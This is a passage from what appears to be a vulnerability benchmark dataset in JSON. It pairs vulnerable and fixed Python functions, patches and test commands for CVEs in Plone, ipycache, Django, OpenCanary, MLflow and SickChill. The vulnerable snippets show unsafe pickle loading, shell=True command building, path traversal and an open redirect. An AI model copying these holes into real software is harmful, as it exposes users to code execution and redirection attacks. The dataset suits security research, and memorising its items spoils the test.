        "snippet": "def isURLInPortal(self, url, context=None):\n    # Note: no docstring, because the method is publicly available\n    # but does not need to be callable on site-url/portal_url/isURLInPortal.\n\n    # Check if a given url is on the same host and contains the portal\n    # path.  Used to ensure that login forms can determine relevant\n    # referrers (i.e. in portal).  Also return true for some relative\n    # urls if context is passed in to allow for url parsing. When context\n    # is not provided, assume that relative urls are in the portal. It is\n    # assumed that http://portal is the same portal as https://portal.\n\n    # External sites listed in 'allow_external_login_sites' of\n    # site_properties are also considered within the portal to allow for\n    # single sign on.\n\n    if len(url.splitlines()) > 1:\n        # very fishy\n        return False\n    if url != url.strip():\n        # somewhat fishy\n        return False\n    if url != \" \".join(url.split()):\n        # Some non-normal whitespace is used, like a tab.\n        # Could be a ploy to circumvent our checks.  We don't trust this.\n        return False\n    if url and not safe_url_first_char(url):\n        return False\n\n    # sanitize url\n    url = re.sub(\"^[\\x00-\\x20]+\", \"\", url).strip()\n    cmp_url = url.lower()\n    for bad in BAD_URL_PARTS:\n        if bad in cmp_url:\n            return False\n\n    p_url = self()\n\n    schema, u_host, u_path, _, _, _ = urlparse(url)\n    if schema and schema not in ALLOWED_SCHEMAS:\n        # Redirecting to 'data:' may be harmful,\n        # and redirecting to 'mailto:' or 'ftp:' is silly.\n        return False\n\n    # Someone may be doing tricks with escaped html code.\n    unescaped_url = unescape(url)\n    if unescaped_url != url:\n        if not self.isURLInPortal(unescaped_url):\n            return False\n\n    if not u_host and not u_path.startswith(\"/\"):\n        if context is None:\n            return True  # old behavior\n        if not context.isPrincipiaFolderish:\n            useurl = context.aq_parent.absolute_url()\n        else:\n            useurl = context.absolute_url()\n    else:\n        useurl = p_url  # when u_path.startswith('/')\n    if not useurl.endswith(\"/\"):\n        useurl += \"/\"\n\n    # urljoin to current url to get an absolute path\n    _, u_host, u_path, _, _, _ = urlparse(urljoin(useurl, url))\n\n    # normalise to end with a '/' so /foobar is not considered within /foo\n    if not u_path:\n        u_path = \"/\"\n    else:\n        u_path = normpath(u_path)\n        if not u_path.endswith(\"/\"):\n            u_path += \"/\"\n    _, host, path, _, _, _ = urlparse(p_url)\n    if not path.endswith(\"/\"):\n        path += \"/\"\n    if host == u_host and u_path.startswith(path):\n        return True\n\n    for external_site in get_external_sites(self):\n        _, host, path, _, _, _ = urlparse(external_site)\n        if not path.endswith(\"/\"):\n            path += \"/\"\n        if host == u_host and u_path.startswith(path):\n            return True\n    return False"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_106_1",
        "commit": "7cbf4a4",
        "file_path": "Products/isurlinportal/__init__.py",
        "start_line": 91,
        "end_line": 180,
        "snippet": "def isURLInPortal(self, url, context=None):\n    # Note: no docstring, because the method is publicly available\n    # but does not need to be callable on site-url/portal_url/isURLInPortal.\n\n    # Check if a given url is on the same host and contains the portal\n    # path.  Used to ensure that login forms can determine relevant\n    # referrers (i.e. in portal).  Also return true for some relative\n    # urls if context is passed in to allow for url parsing. When context\n    # is not provided, assume that relative urls are in the portal. It is\n    # assumed that http://portal is the same portal as https://portal.\n\n    # External sites listed in 'allow_external_login_sites' of\n    # site_properties are also considered within the portal to allow for\n    # single sign on.\n\n    if len(url.splitlines()) > 1:\n        # very fishy\n        return False\n    if url != url.strip():\n        # somewhat fishy\n        return False\n    if url != \" \".join(url.split()):\n        # Some non-normal whitespace is used, like a tab.\n        # Could be a ploy to circumvent our checks.  We don't trust this.\n        return False\n    if url and not safe_url_first_char(url):\n        return False\n\n    # sanitize url\n    url = re.sub(\"^[\\x00-\\x20]+\", \"\", url).strip()\n    cmp_url = url.lower()\n    for bad in BAD_URL_PARTS:\n        if bad in cmp_url:\n            return False\n\n    p_url = self()\n\n    schema, u_host, u_path, _, _, _ = urlparse(url)\n    if schema and schema not in ALLOWED_SCHEMAS:\n        # Redirecting to 'data:' may be harmful,\n        # and redirecting to 'mailto:' or 'ftp:' is silly.\n        return False\n\n    if schema and not u_host:\n        # Example: https:example.org\n        # When we redirect to this, some browsers fail, others happily go to example.org.\n        # In any case, this is not in the portal.\n        return False\n\n    # Someone may be doing tricks with escaped html code.\n    unescaped_url = unescape(url)\n    if unescaped_url != url:\n        if not self.isURLInPortal(unescaped_url):\n            return False\n\n    if not u_host and not u_path.startswith(\"/\"):\n        if context is None:\n            return True  # old behavior\n        if not context.isPrincipiaFolderish:\n            useurl = context.aq_parent.absolute_url()\n        else:\n            useurl = context.absolute_url()\n    else:\n        useurl = p_url  # when u_path.startswith('/')\n    if not useurl.endswith(\"/\"):\n        useurl += \"/\"\n\n    # urljoin to current url to get an absolute path\n    _, u_host, u_path, _, _, _ = urlparse(urljoin(useurl, url))\n\n    # normalise to end with a '/' so /foobar is not considered within /foo\n    if not u_path:\n        u_path = \"/\"\n    else:\n        u_path = normpath(u_path)\n        if not u_path.endswith(\"/\"):\n            u_path += \"/\"\n    _, host, path, _, _, _ = urlparse(p_url)\n    if not path.endswith(\"/\"):\n        path += \"/\"\n    if host == u_host and u_path.startswith(path):\n        return True\n\n    for external_site in get_external_sites(self):\n        _, host, path, _, _, _ = urlparse(external_site)\n        if not path.endswith(\"/\"):\n            path += \"/\"\n        if host == u_host and u_path.startswith(path):\n            return True\n    return False"
      }
    ],
    "vul_patch": "--- a/Products/isurlinportal/__init__.py\n+++ b/Products/isurlinportal/__init__.py\n@@ -41,6 +41,12 @@\n         # and redirecting to 'mailto:' or 'ftp:' is silly.\n         return False\n \n+    if schema and not u_host:\n+        # Example: https:example.org\n+        # When we redirect to this, some browsers fail, others happily go to example.org.\n+        # In any case, this is not in the portal.\n+        return False\n+\n     # Someone may be doing tricks with escaped html code.\n     unescaped_url = unescape(url)\n     if unescaped_url != url:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2019-7539",
    "cve_description": "A code injection issue was discovered in ipycache through 2016-05-31.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/adi928/ipycache",
    "patch_url": [
      "https://github.com/adi928/ipycache/commit/9cc7cb891ff169b3e8a6f5e84afd8238f566ad8e",
      "https://github.com/adi928/ipycache/commit/c73a726744c90cc2cb200b159edbaf5deddcb753"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_23_1",
        "commit": "2c334c5",
        "file_path": "ipycache.py",
        "start_line": 102,
        "end_line": 141,
        "snippet": "def load_vars(path, vars):\n    \"\"\"Load variables from a pickle file.\n    \n    Arguments:\n    \n      * path: the path to the pickle file.\n      * vars: a list of variable names.\n    \n    Returns:\n    \n      * cache: a dictionary {var_name: var_value}.\n    \n    \"\"\"\n    with open(path, 'rb') as f:\n        # Load the variables from the cache.\n        try:\n            cache = pickle.load(f)\n        except EOFError as e:\n            cache={}\n            #raise IOError(str(e))\n        \n        # Check that all requested variables could be loaded successfully\n        # from the cache.\n        missing_vars = sorted(set(vars) - set(cache.keys()))\n        if missing_vars:\n            raise ValueError((\"The following variables could not be loaded \"\n                \"from the cache: {0:s}\").format(\n                ', '.join([\"'{0:s}'\".format(var) for var in missing_vars])))\n        additional_vars = sorted(set(cache.keys()) - set(vars))\n        for hidden_variable in '_captured_io', '_cell_md5':\n            try:\n                additional_vars.remove(hidden_variable)\n            except ValueError:\n                pass\n        if additional_vars:\n            raise ValueError(\"The following variables were present in the cache, \"\n                    \"but removed from the storage request: {0:s}\".format(\n                ', '.join([\"'{0:s}'\".format(var) for var in additional_vars])))\n        \n        return cache"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_23_1",
        "commit": "9cc7cb891ff169b3e8a6f5e84afd8238f566ad8e",
        "file_path": "ipycache.py",
        "start_line": 101,
        "end_line": 142,
        "snippet": "def load_vars(path, vars):\n    \"\"\"Load variables from a pickle file.\n    \n    Arguments:\n    \n      * path: the path to the pickle file.\n      * vars: a list of variable names.\n    \n    Returns:\n    \n      * cache: a dictionary {var_name: var_value}.\n    \n    \"\"\"\n    with open(path, 'rb') as f:\n        # Load the variables from the cache.\n        try:\n            restricted_loads(f.read())\n            cache = pickle.load(f)\n        except EOFError as e:\n            cache={}\n            #raise IOError(str(e))\n        \n        # Check that all requested variables could be loaded successfully\n        # from the cache.\n        missing_vars = sorted(set(vars) - set(cache.keys()))\n        if missing_vars:\n            raise ValueError((\"The following variables could not be loaded \"\n                \"from the cache: {0:s}\").format(\n                ', '.join([\"'{0:s}'\".format(var) for var in missing_vars])))\n        additional_vars = sorted(set(cache.keys()) - set(vars))\n        for hidden_variable in '_captured_io', '_cell_md5':\n            try:\n                additional_vars.remove(hidden_variable)\n            except ValueError:\n                pass\n        if additional_vars:\n            raise ValueError(\"The following variables were present in the cache, \"\n                    \"but removed from the storage request: {0:s}\".format(\n                ', '.join([\"'{0:s}'\".format(var) for var in additional_vars])))\n        \n        return cache\n"
      },
      {
        "id": "fix_py_23_2",
        "commit": "9cc7cb891ff169b3e8a6f5e84afd8238f566ad8e",
        "file_path": "ipycache.py",
        "start_line": 160,
        "end_line": 173,
        "snippet": "class RestrictedUnpickler(pickle.Unpickler):\n\n    def find_class(self, module, name):\n        if module == '_io' and name == 'StringIO':\n            return getattr(sys.modules[module], name)\n        # Forbid everything else.\n        raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" %\n                                     (module, name))\n\n\ndef restricted_loads(s):\n    \"\"\"Helper function analogous to pickle.loads().\"\"\"\n    return RestrictedUnpickler(io.BytesIO(s)).load()\n"
      }
    ],
    "vul_patch": "--- a/ipycache.py\n+++ b/ipycache.py\n@@ -14,6 +14,7 @@\n     with open(path, 'rb') as f:\n         # Load the variables from the cache.\n         try:\n+            restricted_loads(f.read())\n             cache = pickle.load(f)\n         except EOFError as e:\n             cache={}\n\n--- /dev/null\n+++ b/ipycache.py\n@@ -0,0 +1,13 @@\n+class RestrictedUnpickler(pickle.Unpickler):\n+\n+    def find_class(self, module, name):\n+        if module == '_io' and name == 'StringIO':\n+            return getattr(sys.modules[module], name)\n+        # Forbid everything else.\n+        raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" %\n+                                     (module, name))\n+\n+\n+def restricted_loads(s):\n+    \"\"\"Helper function analogous to pickle.loads().\"\"\"\n+    return RestrictedUnpickler(io.BytesIO(s)).load()\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2019-7539:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/ipycache\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2019-7539/bin/python -m pytest test_ipycache.py -v -k \"test_load_exploitPickle\"  -p no:warning --disable-warnings\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2019-7539:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/ipycache\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2019-7539/bin/python -m pytest test_ipycache.py -v -k \"(test_conditional_eval) or (test_clean_var) or (test_clean_vars) or (test_do_save) or (test_load_fail) or (test_cache_outputs) or (test_cache_fail_1)\" -p no:warning --disable-warnings\n\n"
  },
  {
    "cve_id": "CVE-2024-42005",
    "cve_description": "An issue was discovered in Django 5.0 before 5.0.8 and 4.2 before 4.2.15. QuerySet.values() and values_list() methods on models with a JSONField are subject to SQL injection in column aliases via a crafted JSON object key as a passed *arg.",
    "cwe_info": {
      "CWE-89": {
        "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        "description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data."
      }
    },
    "repo": "https://github.com/django/django",
    "patch_url": [
      "https://github.com/django/django/commit/f4af67b9b41e0f4c117a8741da3abbd1c869ab28",
      "https://github.com/django/django/commit/32ebcbf2e1fe3e5ba79a6554a167efce81f7422d"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_1_1",
        "commit": "523da87",
        "file_path": "django/db/models/sql/query.py",
        "start_line": 2442,
        "end_line": 2502,
        "snippet": "    def set_values(self, fields):\n        self.select_related = False\n        self.clear_deferred_loading()\n        self.clear_select_fields()\n        self.has_select_fields = True\n\n        if fields:\n            field_names = []\n            extra_names = []\n            annotation_names = []\n            if not self.extra and not self.annotations:\n                # Shortcut - if there are no extra or annotations, then\n                # the values() clause must be just field names.\n                field_names = list(fields)\n            else:\n                self.default_cols = False\n                for f in fields:\n                    if f in self.extra_select:\n                        extra_names.append(f)\n                    elif f in self.annotation_select:\n                        annotation_names.append(f)\n                    elif f in self.annotations:\n                        raise FieldError(\n                            f\"Cannot select the '{f}' alias. Use annotate() to \"\n                            \"promote it.\"\n                        )\n                    else:\n                        # Call `names_to_path` to ensure a FieldError including\n                        # annotations about to be masked as valid choices if\n                        # `f` is not resolvable.\n                        if self.annotation_select:\n                            self.names_to_path(f.split(LOOKUP_SEP), self.model._meta)\n                        field_names.append(f)\n            self.set_extra_mask(extra_names)\n            self.set_annotation_mask(annotation_names)\n            selected = frozenset(field_names + extra_names + annotation_names)\n        else:\n            field_names = [f.attname for f in self.model._meta.concrete_fields]\n            selected = frozenset(field_names)\n        # Selected annotations must be known before setting the GROUP BY\n        # clause.\n        if self.group_by is True:\n            self.add_fields(\n                (f.attname for f in self.model._meta.concrete_fields), False\n            )\n            # Disable GROUP BY aliases to avoid orphaning references to the\n            # SELECT clause which is about to be cleared.\n            self.set_group_by(allow_aliases=False)\n            self.clear_select_fields()\n        elif self.group_by:\n            # Resolve GROUP BY annotation references if they are not part of\n            # the selected fields anymore.\n            group_by = []\n            for expr in self.group_by:\n                if isinstance(expr, Ref) and expr.refs not in selected:\n                    expr = self.annotations[expr.refs]\n                group_by.append(expr)\n            self.group_by = tuple(group_by)\n\n        self.values_select = tuple(field_names)\n        self.add_fields(field_names, True)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_1_1",
        "commit": "32ebcbf",
        "file_path": "django/db/models/sql/query.py",
        "start_line": 2442,
        "end_line": 2504,
        "snippet": "    def set_values(self, fields):\n        self.select_related = False\n        self.clear_deferred_loading()\n        self.clear_select_fields()\n        self.has_select_fields = True\n\n        if fields:\n            for field in fields:\n                self.check_alias(field)\n            field_names = []\n            extra_names = []\n            annotation_names = []\n            if not self.extra and not self.annotations:\n                # Shortcut - if there are no extra or annotations, then\n                # the values() clause must be just field names.\n                field_names = list(fields)\n            else:\n                self.default_cols = False\n                for f in fields:\n                    if f in self.extra_select:\n                        extra_names.append(f)\n                    elif f in self.annotation_select:\n                        annotation_names.append(f)\n                    elif f in self.annotations:\n                        raise FieldError(\n                            f\"Cannot select the '{f}' alias. Use annotate() to \"\n                            \"promote it.\"\n                        )\n                    else:\n                        # Call `names_to_path` to ensure a FieldError including\n                        # annotations about to be masked as valid choices if\n                        # `f` is not resolvable.\n                        if self.annotation_select:\n                            self.names_to_path(f.split(LOOKUP_SEP), self.model._meta)\n                        field_names.append(f)\n            self.set_extra_mask(extra_names)\n            self.set_annotation_mask(annotation_names)\n            selected = frozenset(field_names + extra_names + annotation_names)\n        else:\n            field_names = [f.attname for f in self.model._meta.concrete_fields]\n            selected = frozenset(field_names)\n        # Selected annotations must be known before setting the GROUP BY\n        # clause.\n        if self.group_by is True:\n            self.add_fields(\n                (f.attname for f in self.model._meta.concrete_fields), False\n            )\n            # Disable GROUP BY aliases to avoid orphaning references to the\n            # SELECT clause which is about to be cleared.\n            self.set_group_by(allow_aliases=False)\n            self.clear_select_fields()\n        elif self.group_by:\n            # Resolve GROUP BY annotation references if they are not part of\n            # the selected fields anymore.\n            group_by = []\n            for expr in self.group_by:\n                if isinstance(expr, Ref) and expr.refs not in selected:\n                    expr = self.annotations[expr.refs]\n                group_by.append(expr)\n            self.group_by = tuple(group_by)\n\n        self.values_select = tuple(field_names)\n        self.add_fields(field_names, True)"
      }
    ],
    "vul_patch": "--- a/django/db/models/sql/query.py\n+++ b/django/db/models/sql/query.py\n@@ -5,6 +5,8 @@\n         self.has_select_fields = True\n \n         if fields:\n+            for field in fields:\n+                self.check_alias(field)\n             field_names = []\n             extra_names = []\n             annotation_names = []\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2024-42005:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/django\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2024-42005/bin/python ./runtests.py expressions.test_queryset_values.ValuesExpressionsTests.test_values_expression_alias_sql_injection_json_field\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2024-42005:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/django\ngit apply --whitespace=nowarn /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2024-42005/bin/python ./runtests.py expressions\n"
  },
  {
    "cve_id": "CVE-2024-48911",
    "cve_description": "OpenCanary, a multi-protocol network honeypot, directly executed commands taken from its config file. Prior to version 0.9.4, where the config file is stored in an unprivileged user directory but the daemon is executed by root, it\u2019s possible for the unprivileged user to change the config file and escalate permissions when root later runs the daemon. Version 0.9.4 contains a fix for the issue.",
    "cwe_info": {
      "CWE-863": {
        "name": "Incorrect Authorization",
        "description": "The product performs an authorization check when an actor attempts to access a resource or perform an action, but it does not correctly perform the check."
      }
    },
    "repo": "https://github.com/thinkst/opencanary",
    "patch_url": [
      "https://github.com/thinkst/opencanary/commit/2c11575b1a3dd8b0df26a879ba856c0aa350c049"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_63_1",
        "commit": "d3956bc",
        "file_path": "opencanary/config.py",
        "start_line": 52,
        "end_line": 84,
        "snippet": "    def __init__(self, configfile=SETTINGS):\n        self.__config = None\n        self.__configfile = configfile\n\n        files = [\n            configfile,\n            \"%s/.%s\" % (expanduser(\"~\"), configfile),\n            \"/etc/opencanaryd/%s\" % configfile,\n        ]\n        print(\n            \"** We hope you enjoy using OpenCanary. For more open source Canary goodness, head over to canarytokens.org. **\"\n        )\n        for fname in files:\n            try:\n                with open(fname, \"r\") as f:\n                    print(\"[-] Using config file: %s\" % fname)\n                    self.__config = json.load(f)\n                    self.__config = expand_vars(self.__config)\n                return\n            except IOError as e:\n                print(\"[-] Failed to open %s for reading (%s)\" % (fname, e))\n            except ValueError as e:\n                print(\"[-] Failed to decode json from %s (%s)\" % (fname, e))\n                subprocess.call(\n                    \"cp -r %s /var/tmp/config-err-$(date +%%s)\" % fname, shell=True\n                )\n            except Exception as e:\n                print(\"[-] An error occurred loading %s (%s)\" % (fname, e))\n        if self.__config is None:\n            print(\n                'No config file found. Please create one with \"opencanaryd --copyconfig\"'\n            )\n            sys.exit(1)"
      },
      {
        "id": "vul_py_63_2",
        "commit": "d3956bc",
        "file_path": "opencanary/modules/portscan.py",
        "start_line": 70,
        "end_line": 71,
        "snippet": "def detectNFTables():\n    return b\"nf_tables\" in subprocess.check_output([\"iptables\", \"--version\"])"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_63_1",
        "commit": "2c11575",
        "file_path": "opencanary/config.py",
        "start_line": 52,
        "end_line": 87,
        "snippet": "    def __init__(self, configfile=SETTINGS):\n        self.__config = None\n        self.__configfile = configfile\n\n        files = [\n            \"/etc/opencanaryd/%s\" % configfile,\n            \"%s/.%s\" % (expanduser(\"~\"), configfile),\n            configfile,\n        ]\n        print(\n            \"** We hope you enjoy using OpenCanary. For more open source Canary goodness, head over to canarytokens.org. **\"\n        )\n        for fname in files:\n            try:\n                with open(fname, \"r\") as f:\n                    print(\"[-] Using config file: %s\" % fname)\n                    self.__config = json.load(f)\n                    self.__config = expand_vars(self.__config)\n                if fname is configfile:\n                    print(\n                        \"[-] Warning, making use of the configuration file in the immediate directory is not recommended! Suggested locations: %s\"\n                        % \", \".join(files[:2])\n                    )\n                return\n            except IOError as e:\n                print(\"[-] Failed to open %s for reading (%s)\" % (fname, e))\n            except ValueError as e:\n                print(\"[-] Failed to decode json from %s (%s)\" % (fname, e))\n                safe_exec(\"cp\", [\"-r\", fname, \"/var/tmp/config-err-$(date +%%s)\"])\n            except Exception as e:\n                print(\"[-] An error occurred loading %s (%s)\" % (fname, e))\n        if self.__config is None:\n            print(\n                'No config file found. Please create one with \"opencanaryd --copyconfig\"'\n            )\n            sys.exit(1)"
      },
      {
        "id": "fix_py_63_2",
        "commit": "2c11575",
        "file_path": "opencanary/modules/portscan.py",
        "start_line": 70,
        "end_line": 71,
        "snippet": "def detectNFTables():\n    return b\"nf_tables\" in safe_exec(\"iptables\", [\"--version\"])"
      }
    ],
    "vul_patch": "--- a/opencanary/config.py\n+++ b/opencanary/config.py\n@@ -3,9 +3,9 @@\n         self.__configfile = configfile\n \n         files = [\n+            \"/etc/opencanaryd/%s\" % configfile,\n+            \"%s/.%s\" % (expanduser(\"~\"), configfile),\n             configfile,\n-            \"%s/.%s\" % (expanduser(\"~\"), configfile),\n-            \"/etc/opencanaryd/%s\" % configfile,\n         ]\n         print(\n             \"** We hope you enjoy using OpenCanary. For more open source Canary goodness, head over to canarytokens.org. **\"\n@@ -16,14 +16,17 @@\n                     print(\"[-] Using config file: %s\" % fname)\n                     self.__config = json.load(f)\n                     self.__config = expand_vars(self.__config)\n+                if fname is configfile:\n+                    print(\n+                        \"[-] Warning, making use of the configuration file in the immediate directory is not recommended! Suggested locations: %s\"\n+                        % \", \".join(files[:2])\n+                    )\n                 return\n             except IOError as e:\n                 print(\"[-] Failed to open %s for reading (%s)\" % (fname, e))\n             except ValueError as e:\n                 print(\"[-] Failed to decode json from %s (%s)\" % (fname, e))\n-                subprocess.call(\n-                    \"cp -r %s /var/tmp/config-err-$(date +%%s)\" % fname, shell=True\n-                )\n+                safe_exec(\"cp\", [\"-r\", fname, \"/var/tmp/config-err-$(date +%%s)\"])\n             except Exception as e:\n                 print(\"[-] An error occurred loading %s (%s)\" % (fname, e))\n         if self.__config is None:\n\n--- a/opencanary/modules/portscan.py\n+++ b/opencanary/modules/portscan.py\n@@ -1,2 +1,2 @@\n def detectNFTables():\n-    return b\"nf_tables\" in subprocess.check_output([\"iptables\", \"--version\"])\n+    return b\"nf_tables\" in safe_exec(\"iptables\", [\"--version\"])\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2024-48911:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/opencanary\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2024-48911/bin/python  hand_test.py\n",
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-6753",
    "cve_description": "Path Traversal in GitHub repository mlflow/mlflow prior to 2.9.2.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/mlflow/mlflow",
    "patch_url": [
      "https://github.com/mlflow/mlflow/commit/1c6309f884798fbf56017a3cc808016869ee8de4"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_395_1",
        "commit": "f01767aefd44a76cc5c3a9852ca50f6757672946",
        "file_path": "mlflow/data/http_dataset_source.py",
        "start_line": 44,
        "end_line": 87,
        "snippet": "    def load(self, dst_path=None) -> str:\n        \"\"\"\n        Downloads the dataset source to the local filesystem.\n\n        :param dst_path: Path of the local filesystem destination directory to which to download the\n                         dataset source. If the directory does not exist, it is created. If\n                         unspecified, the dataset source is downloaded to a new uniquely-named\n                         directory on the local filesystem.\n        :return: The path to the downloaded dataset source on the local filesystem.\n        \"\"\"\n        resp = cloud_storage_http_request(\n            method=\"GET\",\n            url=self.url,\n            stream=True,\n        )\n        augmented_raise_for_status(resp)\n\n        path = urlparse(self.url).path\n        content_disposition = resp.headers.get(\"Content-Disposition\")\n        if content_disposition is not None and (\n            file_name := next(re.finditer(r\"filename=(.+)\", content_disposition), None)\n        ):\n            # NB: If the filename is quoted, unquote it\n            basename = file_name[1].strip(\"'\\\"\")\n            if _is_path(basename):\n                raise MlflowException.invalid_parameter_value(\n                    f\"Invalid filename in Content-Disposition header: {basename}. \"\n                    \"It must be a file name, not a path.\"\n                )\n        elif path is not None and len(posixpath.basename(path)) > 0:\n            basename = posixpath.basename(path)\n        else:\n            basename = \"dataset_source\"\n\n        if dst_path is None:\n            dst_path = create_tmp_dir()\n\n        dst_path = os.path.join(dst_path, basename)\n        with open(dst_path, \"wb\") as f:\n            chunk_size = 1024 * 1024  # 1 MB\n            for chunk in resp.iter_content(chunk_size=chunk_size):\n                f.write(chunk)\n\n        return dst_path"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_395_1",
        "commit": "1c6309f884798fbf56017a3cc808016869ee8de4",
        "file_path": "mlflow/data/http_dataset_source.py",
        "start_line": 60,
        "end_line": 91,
        "snippet": "    def load(self, dst_path=None) -> str:\n        \"\"\"\n        Downloads the dataset source to the local filesystem.\n\n        :param dst_path: Path of the local filesystem destination directory to which to download the\n                         dataset source. If the directory does not exist, it is created. If\n                         unspecified, the dataset source is downloaded to a new uniquely-named\n                         directory on the local filesystem.\n        :return: The path to the downloaded dataset source on the local filesystem.\n        \"\"\"\n        resp = cloud_storage_http_request(\n            method=\"GET\",\n            url=self.url,\n            stream=True,\n        )\n        augmented_raise_for_status(resp)\n\n        basename = self._extract_filename(resp)\n\n        if not basename:\n            basename = \"dataset_source\"\n\n        if dst_path is None:\n            dst_path = create_tmp_dir()\n\n        dst_path = os.path.join(dst_path, basename)\n        with open(dst_path, \"wb\") as f:\n            chunk_size = 1024 * 1024  # 1 MB\n            for chunk in resp.iter_content(chunk_size=chunk_size):\n                f.write(chunk)\n\n        return dst_path"
      }
    ],
    "vul_patch": "--- a/mlflow/data/http_dataset_source.py\n+++ b/mlflow/data/http_dataset_source.py\n@@ -15,21 +15,9 @@\n         )\n         augmented_raise_for_status(resp)\n \n-        path = urlparse(self.url).path\n-        content_disposition = resp.headers.get(\"Content-Disposition\")\n-        if content_disposition is not None and (\n-            file_name := next(re.finditer(r\"filename=(.+)\", content_disposition), None)\n-        ):\n-            # NB: If the filename is quoted, unquote it\n-            basename = file_name[1].strip(\"'\\\"\")\n-            if _is_path(basename):\n-                raise MlflowException.invalid_parameter_value(\n-                    f\"Invalid filename in Content-Disposition header: {basename}. \"\n-                    \"It must be a file name, not a path.\"\n-                )\n-        elif path is not None and len(posixpath.basename(path)) > 0:\n-            basename = posixpath.basename(path)\n-        else:\n+        basename = self._extract_filename(resp)\n+\n+        if not basename:\n             basename = \"dataset_source\"\n \n         if dst_path is None:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-53995",
    "cve_description": "SickChill is an automatic video library manager for TV shows. A user-controlled `login` endpoint's `next_` parameter takes arbitrary content. Prior to commit c7128a8946c3701df95c285810eb75b2de18bf82, an authenticated attacker may use this to redirect the user to arbitrary destinations, leading to open redirect. Commit c7128a8946c3701df95c285810eb75b2de18bf82 changes the login page to redirect to `settings.DEFAULT_PAGE` instead of to the `next` parameter.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/SickChill/sickchill",
    "patch_url": [
      "https://github.com/SickChill/sickchill/commit/c7128a8946c3701df95c285810eb75b2de18bf82"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_270_1",
        "commit": "fc3c53a",
        "file_path": "sickchill/views/authentication.py",
        "start_line": 18,
        "end_line": 32,
        "snippet": "    def post(self, next_=None):\n        notifiers.notify_login(self.request.remote_ip)\n        global login_error\n\n        if self.get_body_argument(\"username\", None) == settings.WEB_USERNAME and self.get_body_argument(\"password\", None) == settings.WEB_PASSWORD:\n            login_error = \"\"\n            remember_me = config.checkbox_to_value(self.get_body_argument(\"remember_me\", \"0\"))\n            self.set_secure_cookie(\"sickchill_user\", settings.API_KEY, expires_days=(None, 30)[remember_me])\n            logger.info(_(\"User logged into the SickChill web interface\"))\n        else:\n            logger.warning(_(\"User attempted a failed login to the SickChill web interface from IP: \") + self.request.remote_ip)\n            login_error = _(\"Incorrect username or password! Both username and password are case sensitive!\")\n\n        next_ = self.get_query_argument(\"next\", next_)\n        self.redirect(next_ or \"/\" + settings.DEFAULT_PAGE + \"/\")"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_270_1",
        "commit": "c7128a8946c3701df95c285810eb75b2de18bf82",
        "file_path": "sickchill/views/authentication.py",
        "start_line": 18,
